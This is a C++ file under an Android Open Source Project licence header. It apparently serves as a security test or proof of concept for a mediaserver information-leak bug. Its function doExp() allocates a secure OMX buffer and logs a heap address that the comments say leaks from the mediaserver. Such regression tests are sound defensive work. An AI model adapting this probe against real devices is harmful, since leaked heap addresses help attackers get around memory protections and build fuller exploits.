/*
 * Copyright (C) 2018 The Android Open Source Project
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 *
 */

#include <OMX_Component.h>
#include <binder/IServiceManager.h>
#include <binder/MemoryDealer.h>
#include <jni.h>
#include <media/IMediaPlayerService.h>
#include <media/IOMX.h>
#include <utils/NativeHandle.h>

using namespace android;

template <class T> static void InitOMXParams(T *params) {
  params->nSize = sizeof(T);
  params->nVersion.s.nVersionMajor = 1;
  params->nVersion.s.nVersionMinor = 0;
  params->nVersion.s.nRevision = 0;
  params->nVersion.s.nStep = 0;
}

struct DummyOMXObserver : public BnOMXObserver {
public:
  DummyOMXObserver() {}

  virtual void onMessages(const std::list<omx_message> &messages __unused) {}

protected:
  virtual ~DummyOMXObserver() {}
};

static bool connectOMX(sp<IOMX> &omx) {
  sp<IServiceManager> sm = defaultServiceManager();

  sp<IBinder> binder = sm->getService(String16("media.player"));
  sp<IMediaPlayerService> mediaPlayerService =
      interface_cast<IMediaPlayerService>(binder);

  if (mediaPlayerService == NULL) {
    ALOGE("cannot get the media player service");
    return false;
  }

  omx = mediaPlayerService->getOMX();
  if (omx == NULL) {
    ALOGE("cannot get the OMX  interface");
    return false;
  }

  return true;
}

int doExp() {

  sp<IServiceManager> sm = defaultServiceManager();
  sp<IBinder> binder = sm->getService(String16("media.player"));
  sp<IMediaPlayerService> mps = interface_cast<IMediaPlayerService>(binder);

  if (mps == NULL) {
    ALOGI("get media player service failed");
    return 0;
  }

  const char *codecName = "OMX.google.mp3.decoder";
  // connect to IOMX each time
  sp<IOMX> service = mps->getOMX();

  IOMX::node_id node = 0;
  sp<DummyOMXObserver> observer = new DummyOMXObserver();
    status_t err = service->allocateNode(codecName, observer, NULL, &node);
  if (err != OK) {
    ALOGI("%s node allocation fails", codecName);
    return 0;
  }
  // allocate buffer
  void *buffer_data = NULL;
  IOMX::buffer_id bufferid = 0;
  sp<NativeHandle> native_handle;
  err = service->allocateSecureBuffer(node, 0, 4096, &bufferid, &buffer_data,&native_handle);
  ALOGE("%x,%p\n", bufferid, buffer_data); // bufferid and buffer_data
                                           // leak the heap address of the
                                           // mediaserver

  if (buffer_data != NULL || bufferid != 0) {
    ALOGE("Media buffer information leak");
  }
  return 1;
}

int main() {
  int ret = doExp();
  return ret;
}